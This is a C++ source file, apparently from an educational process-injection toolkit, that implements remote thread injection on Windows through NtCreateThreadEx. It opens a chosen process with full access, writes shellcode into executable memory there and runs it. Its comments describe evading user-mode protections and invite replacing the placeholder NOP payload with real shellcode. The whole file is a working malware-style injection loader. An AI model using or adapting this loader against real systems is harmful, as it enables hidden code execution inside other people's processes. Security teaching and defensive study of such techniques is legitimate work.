// InjectionLab - Educational Code Injection Toolkit
// injection_ntcreatethreadex.cpp
//
// This example demonstrates process injection using the NtCreateThreadEx API.
// It creates a thread in a target process using the NtCreateThreadEx function, 
// a low-level API that bypasses some user-mode protections and can be used 
// for thread creation in injected processes.

#include <windows.h>
#include <iostream>
#include <winternl.h>

// Defining the NtCreateThreadEx function prototype
typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG ZeroBits,
    ULONG StackSize,
    ULONG MaximumStackSize,
    PVOID AttributeList
);

// Example shellcode: Currently just NOPs for demonstration purposes.
// In practice, you can replace this with a harmless payload like a MessageBox.
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, // NOPs
    // Real shellcode (e.g. MessageBox) can be inserted here
};

int main() {
    DWORD pid;
    std::cout << "[>] Enter the PID of the target process: ";
    std::cin >> pid;

    // Try to obtain a handle to the target process with full access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed for PID " << pid << ". Error code: " << GetLastError() << "\n";
        return 1;
    }

    // Load the NtCreateThreadEx function from ntdll.dll dynamically
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        std::cerr << "[-] Failed to get ntdll.dll module handle.\n";
        CloseHandle(hProcess);
        return 1;
    }

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        std::cerr << "[-] Failed to get NtCreateThreadEx function address.\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Allocate memory in the target process for the shellcode
    LPVOID alloc = VirtualAllocEx(
        hProcess,                // Handle to target process
        nullptr,                 // Let the system determine the address
        sizeof(shellcode),       // Size of allocation
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE   // Memory protection flags
    );
    if (!alloc) {
        std::cerr << "[-] VirtualAllocEx failed.\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode into the allocated memory region
    if (!WriteProcessMemory(hProcess, alloc, shellcode, sizeof(shellcode), nullptr)) {
        std::cerr << "[-] WriteProcessMemory failed.\n";
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process using NtCreateThreadEx
    HANDLE hThread;
    NTSTATUS status = NtCreateThreadEx(
        &hThread,                  // Handle to the new thread
        THREAD_ALL_ACCESS,         // Access rights
        nullptr,                   // No object attributes
        hProcess,                  // Target process handle
        alloc,                     // Entry point (shellcode address)
        nullptr,                   // No argument to thread function
        FALSE,                     // Do not create immediately (not needed)
        0,                         // Zero bits
        0,                         // Stack size (default)
        0,                         // Maximum stack size
        nullptr                    // No thread attributes
    );

    if (status != 0) {
        std::cerr << "[-] NtCreateThreadEx failed. Status: " << status << "\n";
    } else {
        std::cout << "[+] Remote thread created successfully.\n";
        CloseHandle(hThread);
    }

    // Clean up: close the process handle
    CloseHandle(hProcess);
    return 0;
}
